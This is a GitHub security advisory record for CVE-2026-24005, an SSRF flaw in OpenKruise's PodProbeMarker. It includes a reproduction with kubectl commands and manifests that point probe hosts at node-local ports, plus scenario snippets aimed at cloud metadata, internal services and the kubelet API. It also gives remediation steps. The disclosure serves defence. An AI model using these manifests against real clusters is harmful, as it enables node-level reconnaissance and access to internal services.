{
  "id": "GHSA-9fj4-3849-rv9g",
  "modified": "2026-02-25T19:05:14.913103Z",
  "published": "2026-02-25T18:30:40Z",
  "aliases": [
    "CVE-2026-24005"
  ],
  "summary": "OpenKruise PodProbeMarker is Vulnerable to SSRF via Unrestricted Host Field",
  "details": "## Summary\n\nPodProbeMarker allows defining custom probes with TCPSocket or HTTPGet handlers. The webhook validation does not restrict the Host field in these probe configurations. Since kruise-daemon runs with hostNetwork=true, it executes probes from the node network namespace. An attacker with PodProbeMarker creation permission can specify arbitrary Host values (127.0.0.1, 169.254.169.254, internal IPs) to trigger SSRF from the node, perform port scanning, and receive response feedback through NodePodProbe status messages.\n\n## Kubernetes Version\n\n- Kubernetes: v1.30.0 (kind cluster)\n- Distribution: kind\n\n## Component Version\n\n- OpenKruise: v1.8.0\n- kruise-daemon: DaemonSet with hostNetwork=true\n- Affected CRDs: PodProbeMarker, NodePodProbe\n\n## Steps To Reproduce\n\n### Environment Setup\n\n1. Install OpenKruise v1.8.0 in kind cluster:\n```bash\nhelm repo add openkruise https://openkruise.github.io/charts/\nhelm install kruise openkruise/kruise --version 1.8.0 \\\n  --namespace kruise-system --create-namespace\n```\n\n2. Verify kruise-daemon runs with hostNetwork:\n```bash\nkubectl -n kruise-system get ds kruise-daemon -o yaml | grep hostNetwork\n```\nOutput:\n```\nhostNetwork: true\n```\n\n3. Create test namespace and RBAC:\n```bash\nkubectl apply -f - \u003c\u003cEOF\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: tenant-a\n---\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: attacker\n  namespace: tenant-a\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: ppm-creator\n  namespace: tenant-a\nrules:\n- apiGroups: [\"apps.kruise.io\"]\n  resources: [\"podprobemarkers\"]\n  verbs: [\"create\",\"get\",\"list\",\"watch\"]\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: ppm-creator-binding\n  namespace: tenant-a\nsubjects:\n- kind: ServiceAccount\n  name: attacker\n  namespace: tenant-a\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: Role\n  name: ppm-creator\nEOF\n```\n\n4. Deploy victim workload:\n```bash\nkubectl apply -f - \u003c\u003cEOF\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: victim\n  namespace: tenant-a\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: victim\n  template:\n    metadata:\n      labels:\n        app: victim\n    spec:\n      containers:\n      - name: victim\n        image: busybox:1.36\n        command: [\"/bin/sh\",\"-c\",\"sleep 36000\"]\nEOF\n```\n\n### Exploitation Steps\n\n5. Verify node-local port accessibility (kubelet healthz):\n```bash\nNODE_CONTAINER=$(docker ps --format '{{.Names}}' | grep control-plane)\ndocker exec $NODE_CONTAINER curl -s -o /dev/null -w \"%{http_code}\" http://127.0.0.1:10248/healthz\n```\nOutput:\n```\n200\n```\n\n6. Create SSRF PodProbeMarker targeting node-local port (as attacker):\n```bash\nkubectl -n tenant-a apply --as system:serviceaccount:tenant-a:attacker -f - \u003c\u003cEOF\napiVersion: apps.kruise.io/v1alpha1\nkind: PodProbeMarker\nmetadata:\n  name: ppm-tcp-ssrf\n  namespace: tenant-a\nspec:\n  selector:\n    matchLabels:\n      app: victim\n  probes:\n  - name: tcp-ssrf\n    containerName: victim\n    podConditionType: ssrf.kruise.io/tcp\n    probe:\n      tcpSocket:\n        host: 127.0.0.1\n        port: 10248\n      timeoutSeconds: 2\n      periodSeconds: 5\nEOF\n```\nOutput:\n```\npodprobemarker.apps.kruise.io/ppm-tcp-ssrf created\n```\n\n7. Wait for probe execution and observe SSRF result:\n```bash\nsleep 10\nNODE_NAME=$(kubectl get nodes -o jsonpath='{.items[0].metadata.name}')\nkubectl get nodepodprobe $NODE_NAME -o yaml | grep -A 20 \"ppm-tcp-ssrf\"\n```\nOutput:\n```yaml\n      name: ppm-tcp-ssrf#tcp-ssrf\n      probe:\n        tcpSocket:\n          host: 127.0.0.1\n          port: 10248\nstatus:\n  podProbeStatuses:\n  - name: victim-8596ff64d6-jklnb\n    namespace: tenant-a\n    probeStates:\n    - lastProbeTime: \"2026-01-13T17:48:10Z\"\n      name: ppm-tcp-ssrf#tcp-ssrf\n      state: Succeeded\n```\n\nEvidence: Probe succeeded, confirming kruise-daemon accessed node-local port 127.0.0.1:10248 from node network namespace.\n\n8. Demonstrate port scanning capability (closed port):\n```bash\nkubectl -n tenant-a apply --as system:serviceaccount:tenant-a:attacker -f - \u003c\u003cEOF\napiVersion: apps.kruise.io/v1alpha1\nkind: PodProbeMarker\nmetadata:\n  name: ppm-tcp-closed\n  namespace: tenant-a\nspec:\n  selector:\n    matchLabels:\n      app: victim\n  probes:\n  - name: tcp-closed\n    containerName: victim\n    podConditionType: ssrf.kruise.io/tcp-closed\n    probe:\n      tcpSocket:\n        host: 127.0.0.1\n        port: 9999\n      timeoutSeconds: 2\n      periodSeconds: 5\nEOF\n```\n\n9. Observe port scanning result:\n```bash\nkubectl get nodepodprobe $NODE_NAME -o yaml | grep -A 5 \"ppm-tcp-closed\"\n```\nOutput:\n```yaml\n    - lastProbeTime: \"2026-01-13T17:51:08Z\"\n      message: 'dial tcp 127.0.0.1:9999: connect: connection refused'\n      name: ppm-tcp-closed#tcp-closed\n      state: Failed\n```\n\nEvidence: Failed probe with \"connection refused\" message enables port state differentiation for scanning.\n\n10. Verify Pod condition and events:\n```bash\nVICTIM_POD=$(kubectl -n tenant-a get pod -l app=victim -o jsonpath='{.items[0].metadata.name}')\nkubectl -n tenant-a describe pod $VICTIM_POD | grep -A 10 \"Conditions:\"\n```\nOutput:\n```\nConditions:\n  Type                        Status\n  ssrf.kruise.io/tcp          True\n  ssrf.kruise.io/tcp-closed   False\n\nEvents:\n  Normal  KruiseProbeSucceeded  96s (x24 over 3m26s)  kruise-daemon-podprobe\n```\n\n### Source Code Evidence\n\n11. TCPSocket Host field used without restriction:\n\nFile: `pkg/daemon/podprobe/prober.go`\n```go\nfunc (pb *prober) newTCPSocketProber(tcp *v1.TCPSocketAction, podIP string) tcpProber {\n    host := tcp.Host\n    if host == \"\" {\n        host = podIP\n    }\n    return tcpProber{\n        tcp: tcp,\n        host: host,\n    }\n}\n```\n\n12. Webhook validation does not check Host field:\n\nFile: `pkg/webhook/podprobemarker/validating/probe_create_update_handler.go`\n```go\nfunc validateTCPSocketAction(tcp *corev1.TCPSocketAction, fldPath *field.Path) field.ErrorList {\n    return ValidatePortNumOrName(tcp.Port, fldPath.Child(\"port\"))\n}\n```\n\nNote: Only port validation, no Host restriction.\n\n### Attack Scenarios\n\nScenario 1 - Cloud metadata access:\n```yaml\nprobe:\n  tcpSocket:\n    host: 169.254.169.254\n    port: 80\n```\n\nScenario 2 - Internal service discovery:\n```yaml\nprobe:\n  tcpSocket:\n    host: 10.0.0.1\n    port: 6379\n```\n\nScenario 3 - Node-local kubelet API:\n```yaml\nprobe:\n  tcpSocket:\n    host: 127.0.0.1\n    port: 10250\n```\n\n## Supporting Material/References\n\n### Verification Evidence\n\n1. kruise-daemon hostNetwork configuration:\n```bash\n$ kubectl -n kruise-system get ds kruise-daemon -o yaml | grep -A 2 \"hostNetwork\"\n      hostNetwork: true\n      restartPolicy: Always\n```\n\n2. Successful SSRF to open port (127.0.0.1:10248):\n```yaml\nstatus:\n  podProbeStatuses:\n    probeStates:\n    - name: ppm-tcp-ssrf#tcp-ssrf\n      state: Succeeded\n```\n\n3. Port scanning result for closed port (127.0.0.1:9999):\n```yaml\nstatus:\n  podProbeStatuses:\n    probeStates:\n    - message: 'dial tcp 127.0.0.1:9999: connect: connection refused'\n      name: ppm-tcp-closed#tcp-closed\n      state: Failed\n```\n\n4. Pod condition reflecting probe results:\n```\nConditions:\n  Type                        Status\n  ssrf.kruise.io/tcp          True\n  ssrf.kruise.io/tcp-closed   False\n```\n\n### Impact Assessment\n\n- Confidentiality: Medium-High. Access to node-local services, cloud metadata, internal network resources.\n- Integrity: Low. Primarily information disclosure.\n- Availability: Medium. Resource consumption from probe requests.\n\n### Limitations\n\nHTTPGet probe rejected by webhook in OpenKruise v1.8.0:\n```\nError: admission webhook denied the request: spec.probe.probe: Forbidden: current no support http probe\n```\n\nTCPSocket probe remains vulnerable.\n\n### Remediation\n\nTemporary mitigation:\n- Restrict PodProbeMarker creation permissions\n- Apply network policies limiting kruise-daemon egress\n- Audit existing PodProbeMarker resources\n\nPermanent fix:\n- Enforce Host field restrictions in webhook validation\n- Deny private IP ranges (127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16)\n- Require Host to be empty or equal to PodIP\n- Sanitize error messages in NodePodProbe status\n\n---\n\n**Verification Environment**: kind v1.30.0 + OpenKruise v1.8.0",
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/openkruise/kruise",
        "purl": "pkg:golang/github.com/openkruise/kruise"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "1.8.0"
            },
            {
              "fixed": "1.8.3"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-9fj4-3849-rv9g/GHSA-9fj4-3849-rv9g.json"
      }
    },
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/openkruise/kruise",
        "purl": "pkg:golang/github.com/openkruise/kruise"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "1.7.5"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-9fj4-3849-rv9g/GHSA-9fj4-3849-rv9g.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/openkruise/kruise/security/advisories/GHSA-9fj4-3849-rv9g"
    },
    {
      "type": "WEB",
      "url": "https://github.com/openkruise/kruise/commit/94364b76adf3e8a1749a31afe809a163bed29613"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/openkruise/kruise"
    },
    {
      "type": "WEB",
      "url": "https://github.com/openkruise/kruise/releases/tag/v1.7.5"
    },
    {
      "type": "WEB",
      "url": "https://github.com/openkruise/kruise/releases/tag/v1.8.3"
    }
  ]
}